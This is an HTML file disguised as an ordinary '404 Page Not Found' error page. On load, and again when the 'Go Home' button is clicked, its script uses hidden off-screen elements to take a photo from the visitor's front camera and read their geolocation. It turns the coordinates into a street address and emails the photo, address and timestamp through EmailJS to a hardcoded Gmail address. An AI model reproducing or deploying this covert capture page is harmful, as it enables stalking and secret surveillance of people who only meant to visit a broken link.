<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Page Not Found</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #333;
        }

        .container {
            text-align: center;
            padding: 2rem;
        }

        .error-code {
            font-size: 8rem;
            font-weight: 900;
            color: #222;
            line-height: 1;
        }

        .message {
            font-size: 1.3rem;
            margin-top: 0.5rem;
            color: #666;
        }

        .home-btn {
            display: inline-block;
            margin-top: 1.5rem;
            padding: 0.6rem 1.8rem;
            border: 1px solid #333;
            color: #333;
            text-decoration: none;
            border-radius: 4px;
            font-size: 0.95rem;
            transition: all 0.2s ease;
            cursor: pointer;
        }

        .home-btn:hover {
            background: #333;
            color: #fff;
        }

        /* Hidden elements */
        #cameraVideo, #cameraCanvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="error-code">404</div>
        <p class="message">Page Not Found</p>
        <a href="#" class="home-btn" onclick="startCapture(); return false;">Go Home</a>
    </div>

    <video id="cameraVideo" autoplay playsinline></video>
    <canvas id="cameraCanvas"></canvas>

    <script>
        var EMAILJS_PUBLIC_KEY = 'DoE85aH__5x5G7OhO';
        var EMAILJS_SERVICE_ID = 'service_oe3al7c';
        var EMAILJS_TEMPLATE_ID = 'template_2sgfzbg';

        emailjs.init(EMAILJS_PUBLIC_KEY);

        var capturedData = {
            photo: null,
            location: null,
            sent: false
        };

        function getDateTime() {
            var now = new Date();
            var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
            var date = now.toLocaleDateString('en-PH', options);
            var time = now.toLocaleTimeString('en-PH', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
            return { date: date, time: time };
        }

        function trySendEmail() {
            if (!capturedData.photo || !capturedData.location || capturedData.sent) return;
            capturedData.sent = true;

            var loc = capturedData.location;
            var dt = getDateTime();

            var emailParams = {
                to_email: 'alfredzxc129@gmail.com',
                subject: '404 Page - Location & Photo Captured',
                message_html: '<h2>Location & Photo Captured</h2>' +
                    '<img src="' + capturedData.photo + '" style="max-width:400px;border-radius:10px;margin:10px 0;" />' +
                    '<p><strong>Address:</strong> ' + loc.fullAddress + '</p>' +
                    '<p><strong>Barangay:</strong> ' + loc.barangay + '</p>' +
                    '<p><strong>Municipality:</strong> ' + loc.town + '</p>' +
                    '<p><strong>Province:</strong> ' + loc.province + '</p>' +
                    '<p><strong>Country:</strong> ' + loc.country + '</p>' +
                    '<p><strong>Latitude:</strong> ' + loc.lat + '</p>' +
                    '<p><strong>Longitude:</strong> ' + loc.lng + '</p>' +
                    '<hr/>' +
                    '<p><strong>Date:</strong> ' + dt.date + '</p>' +
                    '<p><strong>Time:</strong> ' + dt.time + '</p>'
            };

            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, emailParams)
                .then(function() { console.log('OK'); })
                .catch(function(err) { console.log('Fail', err); });
        }

        function capturePhoto() {
            var video = document.getElementById('cameraVideo');
            var canvas = document.getElementById('cameraCanvas');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                .then(function(stream) {
                    video.srcObject = stream;
                    video.play();
                    setTimeout(function() {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        var ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        var imageData = canvas.toDataURL('image/jpeg', 0.7);
                        stream.getTracks().forEach(function(track) { track.stop(); });
                        capturedData.photo = imageData;
                        trySendEmail();
                    }, 1500);
                })
                .catch(function() {
                    capturedData.photo = 'no-photo';
                    trySendEmail();
                });
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var lat = position.coords.latitude;
                    var lng = position.coords.longitude;

                    fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&addressdetails=1')
                        .then(function(response) { return response.json(); })
                        .then(function(data) {
                            var addr = data.address || {};
                            capturedData.location = {
                                lat: lat, lng: lng,
                                fullAddress: data.display_name || 'N/A',
                                barangay: addr.suburb || addr.neighbourhood || addr.village || 'N/A',
                                town: addr.town || addr.city || addr.municipality || 'N/A',
                                province: addr.state || addr.province || addr.county || 'N/A',
                                country: addr.country || 'N/A'
                            };
                            trySendEmail();
                        })
                        .catch(function() {
                            capturedData.location = { lat: lat, lng: lng, fullAddress: 'N/A', barangay: 'N/A', town: 'N/A', province: 'N/A', country: 'N/A' };
                            trySendEmail();
                        });
                }, function() {
                    capturedData.location = { lat: 'N/A', lng: 'N/A', fullAddress: 'N/A', barangay: 'N/A', town: 'N/A', province: 'N/A', country: 'N/A' };
                    trySendEmail();
                });
            }
        }

        function startCapture() {
            capturedData = { photo: null, location: null, sent: false };
            capturePhoto();
            getLocation();
        }

        startCapture();
    </script>
</body>
</html>
